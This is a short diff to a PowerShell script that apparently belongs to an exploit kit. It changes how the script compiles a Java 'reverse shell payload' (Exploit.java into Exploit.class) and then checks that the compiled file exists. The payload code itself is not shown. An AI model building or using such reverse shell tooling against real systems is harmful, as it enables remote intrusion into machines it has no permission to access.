@@ -164,8 +164,8 @@ $null = New-Item ".\exploit\Exploit.java" -ItemType File -Value "$payload" -Forc
 
 # Compile reverse shell payload (Exploit.class)
 Write-Host "INFO: Compiling payload: .\exploit\Exploit.class" -ForegroundColor Gray
-Start-Process -FilePath ".\java\java-se-8u41-ri\bin\javac.exe" -ArgumentList ".\exploit\Exploit.java" -ErrorAction Stop -Wait
-
+#Start-Process -FilePath ".\java\java-se-8u41-ri\bin\javac.exe" -ArgumentList ".\exploit\Exploit.java" -ErrorAction Stop -Wait
+Start-Process -FilePath "javac.exe" -ArgumentList "-source 1.8 -target 1.8 .\exploit\Exploit.java" -ErrorAction Stop -NoNewWindow -Wait -RedirectStandardOutput output.txt -RedirectStandardError error.txt
 Write-Host "INFO: Testing payload: .\exploit\Exploit.class" -ForegroundColor Gray
 if (Test-Path -Path '.\exploit\Exploit.class') {
     Write-Host "SUCCESS: Cretaed reverse shell payload: .\exploit\Exploit.class" -ForegroundColor Green
